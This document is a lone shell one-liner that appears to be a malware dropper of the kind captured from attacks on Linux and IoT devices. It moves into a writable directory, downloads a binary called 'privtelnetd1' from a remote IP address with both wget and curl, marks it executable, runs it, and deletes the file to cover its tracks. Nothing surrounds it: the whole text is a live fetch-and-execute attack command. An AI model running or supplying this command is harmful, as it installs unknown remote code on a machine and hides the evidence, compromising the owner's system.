cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.97.67/privtelnetd1; curl -O http://188.166.97.67/privtelnetd1; chmod +x privtelnetd1; ./privtelnetd1; rm -rf privtelnetd1
